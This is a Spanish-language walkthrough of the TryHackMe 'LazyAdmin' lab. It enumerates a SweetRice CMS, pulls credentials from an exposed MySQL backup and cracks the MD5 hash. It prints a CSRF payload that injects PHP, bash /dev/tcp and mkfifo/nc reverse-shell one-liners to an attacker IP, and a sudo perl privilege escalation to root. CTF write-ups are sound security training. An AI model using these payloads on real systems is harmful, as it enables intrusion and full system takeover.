---
title: LazyAdmin Writeup - TryHackMe
date: 2023-06-05
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Easy, Backup Disclosure, CSRF]
img_path: /assets/img/commons/lazy_admin/
image: lazy_admin.jpeg
---

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.151.164
PING 10.10.151.164 (10.10.151.164) 56(84) bytes of data.
64 bytes from 10.10.151.164: icmp_seq=1 ttl=61 time=271 ms

--- 10.10.151.164 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 270.928/270.928/270.928/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.151.164 -oG allPorts.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 23:14 -05
Nmap scan report for 10.10.151.164
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.62 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 22,80 -sV -sC --min-rate 5000 10.10.151.164 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 23:15 -05
Nmap scan report for 10.10.151.164
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.16 seconds
```

El reporte nos revela únicamente que en la máquina víctima se están ejecutando los servicios **SSH** (`OpenSSH 7.2p2`) y **HTTP** (`Apache 2.4.18`).

### HTTP - 80

Al ingresar al sitio web, nos encontramos con la página predeterminada de Apache.

![web](web.png)

Inspeccionamos el código fuente, pero no encontramos ninguna información relevante.

Realizamos un fuzzing de directorios para identificar posibles recursos interesantes.

```bash
❯ wfuzz -c -L -t 200 --hc=404,403 --hh=11321 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.151.164/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.151.164/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                              
=====================================================================

000000075:   200        35 L     151 W      2199 Ch     "content"
```

Como resultado, encontramos el directorio `content`. Al acceder a dicho directorio, nos encontramos con la siguiente página del **CMS Basic SweetRice**.

![cms](cms.png)

Realizamos nuevamente fuzzing de subdirectorios dentro de `content`.

```bash
❯ wfuzz -c -L -t 200 --hc=404,403 --hh=2199 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.151.164/content/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.151.164/content/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                              
=====================================================================

000000016:   200        28 L     174 W      3444 Ch     "images"                                                                                                             
000000953:   200        20 L     103 W      1777 Ch     "js"                                                                                                                 
000002190:   200        44 L     352 W      6685 Ch     "inc"                                                                                                                
000003320:   200        113 L    252 W      3669 Ch     "as"                                                                                                                 
000003601:   200        16 L     60 W       964 Ch      "_themes"                                                                                                            
000003808:   200        15 L     49 W       774 Ch      "attachment"
```

Los resultados revelan varios subdirectorios, sin embargo, el más interesante es `as`, ya que nos proporciona un panel de inicio de sesión.

![login](login.png)

Al conocer el CMS empleado, podemos averiguar su versión de forma sencilla. Al ser un CMS de código abierto, basta con revisar el repositorio oficial en GitHub. 

Tras una inspección, encontramos que la versión utilizada se revela en el archivo `/inc/latest.txt`.

![version](version.png)

Una vez conocida la versión, podemos investigar posibles exploits conocidos utilizando la herramienta `searchsploit`.

```bash
❯ searchsploit SweetRice 1.5.1
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 1.5.1 - Arbitrary File Download                                                                                                           | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                             | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                                 | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                                        | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                   | php/webapps/40700.html
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Explotación

---

### Backup Disclosure

Uno de los exploits señala una revelación de copias de seguridad, podemos ejecutar el siguiente comando para examinarlo:

```bash
❯ searchsploit -x php/webapps/40718.txt
```

Según la prueba de concepto, parece que podemos acceder a todas las copias de seguridad de MySQL y descargarlas desde el siguiente directorio: `http://localhost/inc/mysql_backup`.

```bash
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016

Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip
```

Al confirmar la existencia del archivo en el directorio mencionado y al tener acceso a la copia de seguridad de MySQL, podemos proceder a descargar el archivo.

![backup](backup.png)

Realizamos una filtración del archivo utilizando el patrón **pass** con el objetivo de encontrar posibles contraseñas.

![pass](pass.png)

Observamos que los resultados revelan un usuario y una contraseña en formato hash. Para identificar el tipo de hash utilizado, podemos utilizar la herramienta `hash-identifier` pasando como argumento el hash que hemos obtenido.

```bash
❯ hash-identifier "42f749ade7f9e195bf475f37a44cafcb"
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

[...]
```

Dado que el resultado indica que posiblemente se trate de un hash MD5, procedemos a utilizar **John the Ripper** para intentar descifrar el hash.

```bash
❯ john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)     
1g 0:00:00:00 DONE (2023-06-06 00:04) 50.00g/s 1689Kp/s 1689Kc/s 1689KC/s coco21..redlips
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Una vez que hemos obtenido la contraseña en texto plano, podemos iniciar sesión en el panel de inicio de sesión utilizando el nombre de usuario **manager** y la contraseña descifrada.

![dashboard](dashboard.png)

### **Cross-Site Request Forgery**

Si recordamos el resultado de **Searchploit**, encontramos varios exploits, entre ellos se encuentra uno denominado **Cross-Site Request Forgery / PHP Code Execution**. Ejecutamos el siguiente comando para examinarlo.

```bash
❯ searchsploit -x php/webapps/40700.html
```

La descripción indica que existe una vulnerabilidad de **Cross-Site Request Forgery (CSRF)** en la sección de adición de anuncios, la cual permite que un atacante ejecute código PHP en el servidor. 

En este exploit en particular, se ha añadido el siguiente código: `echo '<h1> Hacked </h1>'; phpinfo();`

```bash
[+] Haval-128
[+] Haval-128(HMAC)
# Date: 30-11-2016
# Exploit Author: Ashiyane Digital Security Team
# Vendor Homepage: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1

# Description :

# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo();
Code You Can
Customize Exploit For Your Self .

# Exploit :
-->

<html>
<body onload="document.exploit.submit();">
<form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php
  -->
```

Modificamos el código HTML para especificar la dirección IP de la máquina víctima y la ruta del CMS.

`<form action="http://10.10.151.164/content/as/?type=ad&mode=save" method="POST" name="exploit">`
A continuación, ejecutamos el archivo HTML utilizando el siguiente comando:

```bash
❯ firefox exploit.html
```

![ads](ads.png)

Una vez ejecutado el archivo HTML, podemos acceder a la página en `http://10.10.151.164/content/inc/ads/hacked.php`. 

Como se puede observar, el código PHP se ha interpretado correctamente.

![hacked](hacked.png)

El siguiente paso es modificar el archivo HTML para generar una reverse shell en lugar de simplemente imprimir la frase "Hacked".

```bash
<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.151.164/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.11.100/443 0>&1'");
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>
```

Una vez realizada la modificación, accedemos a la siguiente ruta:

```bash
10.10.151.164/content/inc/ads/hacked.php
```

Después de acceder a la ruta y haber establecido la escucha previa, deberíamos tener acceso al sistema como el usuario `www-data`.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.151.164] 35610
bash: cannot set terminal process group (1055): Inappropriate ioctl for device
bash: no job control in this shell
www-data@THM-Chal:/var/www/html/content/inc/ads$ whoami
whoami
www-data
```

## Escalación de privilegios

---

Al acceder al directorio principal del usuario `itguy` y listar los archivos y directorios, nos encontraremos con lo siguiente:

```bash
www-data@THM-Chal:/home/itguy$ ls -al
total 148
drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 .
drwxr-xr-x  3 root  root  4096 Nov 29  2019 ..
-rw-------  1 itguy itguy 1630 Nov 30  2019 .ICEauthority
-rw-------  1 itguy itguy   53 Nov 30  2019 .Xauthority
lrwxrwxrwx  1 root  root     9 Nov 29  2019 .bash_history -> /dev/null
-rw-r--r--  1 itguy itguy  220 Nov 29  2019 .bash_logout
-rw-r--r--  1 itguy itguy 3771 Nov 29  2019 .bashrc
drwx------ 13 itguy itguy 4096 Nov 29  2019 .cache
drwx------ 14 itguy itguy 4096 Nov 29  2019 .config
drwx------  3 itguy itguy 4096 Nov 29  2019 .dbus
-rw-r--r--  1 itguy itguy   25 Nov 29  2019 .dmrc
drwx------  2 itguy itguy 4096 Nov 29  2019 .gconf
drwx------  3 itguy itguy 4096 Nov 30  2019 .gnupg
drwx------  3 itguy itguy 4096 Nov 29  2019 .local
drwx------  5 itguy itguy 4096 Nov 29  2019 .mozilla
-rw-------  1 itguy itguy  149 Nov 29  2019 .mysql_history
drwxrwxr-x  2 itguy itguy 4096 Nov 29  2019 .nano
-rw-r--r--  1 itguy itguy  655 Nov 29  2019 .profile
-rw-r--r--  1 itguy itguy    0 Nov 29  2019 .sudo_as_admin_successful
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-clipboard.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-display.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-draganddrop.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-seamless.pid
-rw-------  1 itguy itguy   82 Nov 30  2019 .xsession-errors
-rw-------  1 itguy itguy   82 Nov 29  2019 .xsession-errors.old
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Desktop
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Documents
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Downloads
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Music
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Pictures
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Public
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Templates
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Videos
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
-rw-r--r--  1 itguy itguy 8980 Nov 29  2019 examples.desktop
-rw-rw-r--  1 itguy itguy   16 Nov 29  2019 mysql_login.txt
-rw-rw-r--  1 itguy itguy   38 Nov 29  2019 user.txt
```

Excelente, al haber encontrado la flag del usuario, procedemos a leerla.

```bash
www-data@THM-Chal:/home/itguy$ cat user.txt 
THM{********************************}
```

### Binario con permisos SUDO

También encontramos un archivo Perl que ejecuta el script `/etc/copy.sh`. 

Al examinar el script, nos damos cuenta de que genera una reverse shell hacia la dirección IP 192.168.0.190 y el puerto 5554.

```bash
www-data@THM-Chal:/home/itguy$ cat backup.pl 
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

Si leemos los permisos del script podemos observar que tenemos permisos de escritura. 

Podemos considerar realizar modificaciones en el script para establecer una conexión de reverse shell hacia nuestro equipo atacante.

```bash
www-data@THM-Chal:/home/itguy$ ls -l /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

Antes de realizar cualquier modificación en el script, sería prudente averiguar si el usuario actual tiene permisos de sudo y qué comandos puede ejecutar. Para hacerlo, podemos utilizar el comando `sudo -l` para mostrar los privilegios de sudo del usuario actual.

```bash
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

¡Excelente! Al observar los resultados de `sudo -l`, notamos que el usuario `www-data` tiene los privilegios de sudo para ejecutar el comando `/home/itguy/backup.pl` sin requerir una contraseña.

A continuación, procedemos a modificar el script `/etc/copy.sh`, donde especificaremos nuestra dirección IP con el fin de generar una reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.11.100 5554 >/tmp/f
```

Luego, ejecutamos el script utilizando el comando `sudo`.

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

Y después de haber establecido la escucha en el puerto especificado en el script, habremos obtenido privilegios de `root`.

```bash
❯ nc -nlvp 5554
listening on [any] 5554 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.151.164] 33616
# whoami
root
```

Finalmente, accedemos al directorio principal del usuario `root` y leemos la última flag.

```bash
# cd
# ls
root.txt
# cat root.txt
THM{********************************}
```

!Happy Hacking¡


